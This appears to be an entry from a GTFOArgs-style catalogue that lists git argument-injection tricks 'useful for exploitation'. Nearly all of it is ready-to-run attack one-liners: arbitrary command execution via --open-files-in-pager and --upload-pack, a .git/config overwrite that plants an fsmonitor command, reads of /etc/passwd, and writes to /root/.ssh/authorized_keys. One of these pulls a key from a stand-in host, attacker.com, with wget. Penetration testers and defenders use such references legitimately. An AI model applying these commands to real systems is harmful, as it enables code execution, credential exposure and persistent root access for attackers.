---
description: Git is an extremely powerful tool with more functionality than one can count. This list is non-exhaustive, but includes examples which have historically been useful for exploitation.
functions:
  command:
    - description: The --open-files-in-pager flag can be used to run arbitrary commands.
      code: |
        git grep --open-files-in-pager='uname -a #' .
        git grep --open-files-in-pager='uname;' .
    - description: The --upload-pack flag can be used in multiple contexts. Note that the output is not necessarily shown (but you can route the output to stderr and possibly view it, by using `>&2`). ls-remote is the only example which does not require the command to be run within a tracked folder.
      code: |
        git ls-remote --upload-pack='uname -a > /tmp/file #' main
        git fetch origin --upload-pack='cat /etc/passwd >&2 ;'
        git pull origin --upload-pack='wget attacker.com/key -O /root/.ssh/authorized-keys #'
    - description: This method takes advantage of one of the file-write methods to overwrite `.git/config`. Officially, this is probably out of scope of GTFOArgs, but it is included anyways. `id` is executed and written to `/tmp/fsmonitor` in this example.
      code: |
        git commit --allow-empty -m 'fsmonitor = "id>/tmp/fsmonitor"'
        git commit --allow-empty -m '[core]'
        git log --max-count=2 --pretty=format:"%s" --output=./.git/config
        git status
  file-read:
    - description: It is common to use `git diff` to compare a single file to a different version of itself in history. The `--no-index` flag can be used to effectively turn `git diff` into normal `diff` against another file _within the git repository_ (but not necessarily tracked).
      code: |
        git diff --no-index local-secret-file.conf git.md
    - description: If you are reading a file outside of the git directory, you can use `git diff` against `/dev/null`.
      code: |
        git diff /dev/null /etc/passwd
  file-write:
    - description: Outputs the most recent changelog to an arbitrary file. Note that this also contains the commit information.
      code: |
        git log --max-count=1 --output=/root/.ssh/authorized_keys
    - description: Outputs the first line of the most recent commit message to an arbitrary file.
      code: |
        git log --max-count=1 --pretty=format:"%s" --output=/root/.ssh/authorized_keys
    - description: Can be used to overwrite a file, or create an empty file.
      code: |
        git blame --output=/tmp/file_to_truncate.txt
---
